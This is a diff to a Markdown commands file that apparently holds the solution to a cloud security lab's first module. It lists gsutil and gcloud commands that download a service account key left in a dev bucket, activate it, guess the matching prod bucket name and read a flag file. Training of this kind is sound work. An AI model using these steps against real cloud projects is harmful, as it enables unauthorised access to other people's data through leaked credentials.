@@ -1,6 +1,46 @@
 # Commands
 
 <details>
+  <summary>***** Module 1 *****</summary>
+
+## Module 1
+
+list dev bucket contents
+#####
+    gsutil ls gs://modeldata-dev-$PROJECT_ID/
+
+download service account key
+#####
+    gsutil cp gs://modeldata-dev-$PROJECT_ID/bucket-service-account.json .
+
+activate service account
+#####
+    gcloud auth activate-service-account --key-file=bucket-service-account.json
+
+discover prod bucket
+#####
+    gsutil ls gs://modeldata-prod-$PROJECT_ID/
+
+find flag
+#####
+    gsutil cat gs://modeldata-prod-$PROJECT_ID/secret_benchmarks/flag1_gpt5_benchmarks.txt
+
+  <details>
+    <summary>Walkthrough Module 1</summary>
+    
+  1. List contents of the dev bucket provided
+  2. Notice the service account JSON file
+  3. Download and activate the service account
+  4. Test predictable bucket naming (dev → prod)
+  5. Access prod bucket and find the flag
+
+  </details>
+
+</details>
+
+#
+
+<details>
   <summary>***** Module 2 *****</summary>
 
 ## Module 2
